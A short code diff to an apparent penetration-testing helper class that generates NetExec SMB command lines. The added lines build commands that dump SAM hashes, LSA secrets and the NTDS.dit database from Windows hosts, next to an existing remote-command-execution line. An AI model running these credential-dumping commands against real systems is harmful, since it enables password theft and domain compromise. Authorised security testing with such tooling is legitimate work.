@@ -44,6 +44,12 @@ class CommandNxcSmb(Command):
         commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' -X \'{command}\'')
         commands.append('')
 
+        commands.append('# Dumping (as admin / domain admin)')
+        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' --sam')
+        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' --lsa')
+        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' --ntds')
+        commands.append('')
+
         commands.append('# SMB shares')
         commands.append('## List SMB shares')
         commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' --shares')
